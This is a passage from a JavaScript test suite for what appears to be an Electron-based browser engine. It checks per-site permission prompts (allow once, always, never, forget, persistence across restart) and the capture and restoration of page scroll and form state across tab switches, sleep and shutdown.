  engine.permissionAnswer({ id: a.id, decision: 'never' });
  assert.equal(await both, false);
  assert.deepEqual(engine.settings.sitePermissions['meet.example'], { camera: 'allow', microphone: 'deny' });
  const events = permEvents(world).length;
  assert.equal(await ask(engine, tabId, ['camera', 'microphone']), false, 'a blocked kind refuses the whole request');
  assert.equal(await ask(engine, tabId, ['camera']), true, 'the allowed kind alone still works');
  assert.equal(permEvents(world).length, events, 'both silently');
});

test('site permissions: a remembered answer also settles asks still queued for that site, on any tab', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const a = ok(engine.tabCreate({ url: 'https://meet.example/a' })).tabId;
  const b = ok(engine.tabCreate({ url: 'https://meet.example/b' })).tabId; // active
  const queuedOnA = ask(engine, a, ['camera', 'microphone']); // background: waits unseen
  const shownOnB = ask(engine, b, ['microphone']);
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'never' });
  assert.equal(await shownOnB, false);
  assert.equal(await queuedOnA, false, 'the mic is now blocked for the site, so A\'s pending pair is refused too');
  assert.equal(engine.permissionQueues.has(a), false);
  // An allow narrows a queued ask to what is still undecided.
  const geoB = ask(engine, b, ['geolocation']);
  const camGeoA = ask(engine, a, ['camera', 'geolocation']);
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'always' });
  assert.equal(await geoB, true);
  engine.tabActivate({ tabId: a });
  assert.deepEqual(lastPermAsk(world).kinds, ['camera'], 'the part already allowed dropped out of the queued ask');
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'once' });
  assert.equal(await camGeoA, true);
});

test('site permissions: forget drops one kind or a whole site; decisions survive a restart', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://www.meet.example/' }));
  const p = ask(engine, tabId, ['camera', 'microphone'], { host: 'www.meet.example' });
  assert.equal(lastPermAsk(world).host, 'meet.example', 'keyed by the normalized site, www stripped');
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'always' });
  assert.equal(await p, true);
  const q = ask(engine, tabId, ['notifications'], { host: 'meet.example' });
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'never' });
  assert.equal(await q, false);
  // Restart on the same files: the map comes back through the migrator.
  const { engine: again } = boot(world);
  assert.deepEqual(again.settings.sitePermissions, { 'meet.example': { camera: 'allow', microphone: 'allow', notifications: 'deny' } });
  assert.deepEqual(again.permissionForget({ host: 'WWW.meet.example', kind: 'microphone' }), { ok: true });
  assert.deepEqual(again.settings.sitePermissions, { 'meet.example': { camera: 'allow', notifications: 'deny' } });
  assert.deepEqual(again.permissionForget({ host: 'meet.example', kind: 'screen' }), { error: 'bad kind' });
  assert.deepEqual(again.permissionForget({ host: 'not a host' }), { error: 'bad host' });
  assert.deepEqual(again.permissionForget({}), { error: 'bad host' });
  assert.deepEqual(again.permissionForget({ host: 'meet.example' }), { ok: true });
  assert.deepEqual(again.settings.sitePermissions, {});
  assert.deepEqual(world.files.get(SETTINGS_FILE).sitePermissions, {}, 'persisted');
});

test('site permissions: malformed requests are refused without asking', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/' }));
  assert.equal(await engine.permissionRequest({ tabId: 'ghost', kinds: ['camera'], host: 'meet.example' }), false, 'unknown tab');
  assert.equal(await engine.permissionRequest({ tabId, kinds: ['camera'], host: '' }), false, 'no host');
  assert.equal(await engine.permissionRequest({ tabId, kinds: ['camera'], host: 'raha' }), false, 'not a site');
  assert.equal(await engine.permissionRequest({ tabId, kinds: [], host: 'meet.example' }), false, 'nothing asked');
  assert.equal(await engine.permissionRequest({ tabId, kinds: ['screen', 'usb'], host: 'meet.example' }), false, 'unknown kinds are not askable');
  assert.equal(await engine.permissionRequest({ tabId, kinds: 'camera', host: 'meet.example' }), false, 'kinds must be a list');
  assert.equal(await engine.permissionRequest({}), false);
  assert.equal(permEvents(world).length, 0);
  // A junk kind mixed with a real one asks only about the real one.
  const p = engine.permissionRequest({ tabId, kinds: ['usb', 'camera'], host: 'meet.example' });
  assert.deepEqual(lastPermAsk(world).kinds, ['camera']);
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'dismiss' });
  assert.equal(await p, false);
});

test('site permissions: "allow once" lasts for the page visit — checks and repeat requests on that tab pass silently, other tabs still ask, leaving the site ends it', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const other = ok(engine.tabCreate({ url: 'https://meet.example/other' })).tabId;
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/room' })); // active; `other` keeps running
  const check = (/** @type {string} */ t, /** @type {string} */ kind) => engine.permissionCheck({ tabId: t, host: 'meet.example', kind });
  assert.equal(check(tabId, 'camera'), false, 'undecided reads as denied to a mere check (Electron has no "prompt")');

  // A queued ask on the same tab narrows to what the once-grant left undecided.
  const cam = ask(engine, tabId, ['camera']);
  const camGeo = ask(engine, tabId, ['camera', 'geolocation']);
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'once' });
  assert.equal(await cam, true);
  assert.deepEqual(lastPermAsk(world).kinds, ['geolocation'], 'the camera part was just allowed for this visit');
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'dismiss' });
  assert.equal(await camGeo, false);
  assert.deepEqual(engine.settings.sitePermissions, {}, 'once persists nothing');

  const events = permEvents(world).length;
  assert.equal(check(tabId, 'camera'), true, 'a check on this visit says granted');
  assert.equal(check(tabId, 'microphone'), false);
  assert.equal(await ask(engine, tabId, ['camera']), true, 'the same visit does not ask again');
  assert.equal(permEvents(world).length, events, 'silently');
  assert.equal(check(other, 'camera'), false, 'per tab: the other tab on the same site has no grant');
  const view = must(world.viewsByTab.get(tabId), 'view');
  view.loadURL('https://www.meet.example/again'); // same site: the visit continues
  assert.equal(check(tabId, 'camera'), true);
  view.loadURL('https://elsewhere.example/');
  view.loadURL('https://meet.example/back');
  assert.equal(check(tabId, 'camera'), false, 'leaving the site ended the grant');
  const again = ask(engine, tabId, ['camera']);
  assert.deepEqual(lastPermAsk(world).kinds, ['camera'], 'so it asks again');
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'once' });
  assert.equal(await again, true);
  engine.tabSleep({ tabId });
  engine.tabActivate({ tabId });
  assert.equal(check(tabId, 'camera'), false, 'sleep ends it too');
  // Checks never invent anything: junk tab / host / kind read as denied.
  assert.equal(engine.permissionCheck({ tabId: 'ghost', host: 'meet.example', kind: 'camera' }), false);
  assert.equal(engine.permissionCheck({ tabId, host: '', kind: 'camera' }), false);
  assert.equal(engine.permissionCheck({ tabId, host: 'meet.example', kind: 'screen' }), false);
  assert.equal(engine.permissionCheck({}), false);
});

// ---------------------------------------------------------------- R-104 page state

test('page state: switch-away captures, sleep saves, wake restores, then clears node', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10, restorePageState: true });
  const { tabId: t1 } = ok(engine.tabCreate({ url: 'https://a.example/' }));
  const v1 = must(world.viewsByTab.get(t1), 'view for t1');
  v1.simulateScroll(300, 10);
  v1.simulateFormInput([{ p: '0/0', n: 'input:text:q', k: 'text', v: 'hello' }]);

  ok(engine.tabCreate({ url: 'https://b.example/' }));
  await Promise.resolve(); // let capturePageState promise resolve

  const rt1 = engine.runtime.get(t1);
  assert.ok(rt1, 'tab 1 still running');
  assert.ok(rt1.pageState, 'capture on switch-away');
  assert.equal(rt1.pageState.sy, 300);
  assert.equal(rt1.pageState.fields.length, 1);

  engine.tabSleep({ tabId: t1 });
  const node = must(engine.tabNode(t1), 'sleeping node');
  assert.ok(node.pageState, 'sleep persisted pageState to node');
  assert.equal(node.pageState.sy, 300);

  engine.tabActivate({ tabId: t1 });
  assert.equal(v1.restoredPageState, null, 'old view destroyed; restore on new view');
  const v1b = must(world.viewsByTab.get(t1), 'new view');
  assert.ok(v1b.restoredPageState, 'restorePageState called on wake');
  const wokenNode = must(engine.tabNode(t1), 'woken node');
  assert.equal(wokenNode.pageState, null, 'node.pageState cleared after wake');
});

test('page state: tick refreshes active tab page state', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10, restorePageState: true });
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.example/' }));
  const view = must(world.viewsByTab.get(tabId), 'view');
  view.simulateScroll(500);

  engine.tick();
  await Promise.resolve();

  const rt = engine.runtime.get(tabId);
  assert.ok(rt?.pageState, 'tick captured page state');
  assert.equal(rt.pageState.sy, 500);
});

test('page state: shutdown saves rt.pageState to every running tab node', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10, restorePageState: true });
  const { tabId: t1 } = ok(engine.tabCreate({ url: 'https://a.example/' }));
  const { tabId: t2 } = ok(engine.tabCreate({ url: 'https://b.example/' }));

  const rt1 = must(engine.runtime.get(t1), 'rt1');
  const rt2 = must(engine.runtime.get(t2), 'rt2');
  rt1.pageState = { v: 1, url: 'https://a.example/', at: world.clock, sx: 0, sy: 100, fields: [] };
  rt2.pageState = { v: 1, url: 'https://b.example/', at: world.clock, sx: 0, sy: 200, fields: [] };

  engine.shutdown();

  const n1 = must(engine.tabNode(t1));
  const n2 = must(engine.tabNode(t2));
  assert.equal(n1.pageState?.sy, 100, 'shutdown persisted t1 page state');
  assert.equal(n2.pageState?.sy, 200, 'shutdown persisted t2 page state');

  const saved = world.files.get('state.json');
  assert.ok(saved, 'state.json written');
  const tab1 = Object.values(saved.tree.nodes).find((n) => n.url === 'https://a.example/');
  assert.equal(tab1.pageState?.sy, 100, 'page state on disk');
});

test('page state: navOmnibox on asleep tab clears pageState alongside navJson', () => {
  const { engine } = boot(new FakeWorld(), { maxLiveTabs: 2, restorePageState: true });
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.example/' }));
  engine.tabSleep({ tabId });
  const node = must(engine.tabNode(tabId));
  node.pageState = { v: 1, url: 'https://a.example/', at: 1, sx: 0, sy: 400, fields: [] };
  node.navJson = '{"entries":[],"index":0}';

  engine.navOmnibox({ input: 'https://b.example/', tabId });

  assert.equal(node.navJson, null, 'navJson cleared');
  assert.equal(node.pageState, null, 'pageState cleared');
});

test('page state: settingsSet restorePageState=false wipes all stored state', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10, restorePageState: true });
  const { tabId: t1 } = ok(engine.tabCreate({ url: 'https://a.example/' }));
  const { tabId: t2 } = ok(engine.tabCreate({ url: 'https://b.example/' }));
  engine.tabSleep({ tabId: t2 });

  const rt = must(engine.runtime.get(t1), 'rt');
  rt.pageState = { v: 1, url: 'https://a.example/', at: world.clock, sx: 0, sy: 100, fields: [] };
  const n2 = must(engine.tabNode(t2));
  n2.pageState = { v: 1, url: 'https://b.example/', at: world.clock, sx: 0, sy: 200, fields: [] };

  engine.settingsSet({ restorePageState: false });

  assert.equal(rt.pageState, null, 'running tab runtime wiped');
  assert.equal(n2.pageState, null, 'asleep tab node wiped');
});

test('page state: capturePageState skipped when restorePageState is off or tab is loading', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10, restorePageState: false });
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.example/' }));
  const view = must(world.viewsByTab.get(tabId), 'view');
  view.simulateScroll(999);

  engine.tick();
  await Promise.resolve();

  const rt = must(engine.runtime.get(tabId), 'rt');
  assert.equal(rt.pageState, null, 'setting off -> no capture');

  engine.settingsSet({ restorePageState: true });
  rt.loading = true;
  engine.tick();
  await Promise.resolve();
  assert.equal(rt.pageState, null, 'loading -> no capture');
});

test('page state: tabShowGrid captures page state of the previous active tab', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10, restorePageState: true });
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.example/' }));
  const view = must(world.viewsByTab.get(tabId), 'view');
  view.simulateScroll(150);

  engine.tabShowGrid();
  await Promise.resolve();

  const rt = must(engine.runtime.get(tabId), 'rt');
  assert.ok(rt?.pageState, 'grid transition captured page state');
  assert.equal(rt.pageState.sy, 150);
});
